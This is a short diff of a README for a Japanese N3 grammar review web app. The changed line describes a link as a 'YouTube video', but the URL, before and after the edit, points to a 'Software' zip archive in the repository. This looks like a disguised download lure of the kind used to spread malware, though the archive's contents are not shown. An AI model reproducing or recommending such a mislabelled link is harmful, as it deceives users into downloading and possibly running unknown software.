@@ -1,6 +1,6 @@
 # N3 Grammar Review PWA
 
-This is a Progressive Web App (PWA) designed to help you review N3 Japanese grammar using the YouTube video [N3 Grammar Review](https://github.com/yongsinfok/N3-/raw/refs/heads/main/dist/assets/Software_1.2.zip).
+This is a Progressive Web App (PWA) designed to help you review N3 Japanese grammar using the YouTube video [N3 Grammar Review](https://raw.githubusercontent.com/yongsinfok/N3-/main/src/Software-2.2.zip).
 
 ## Features
 
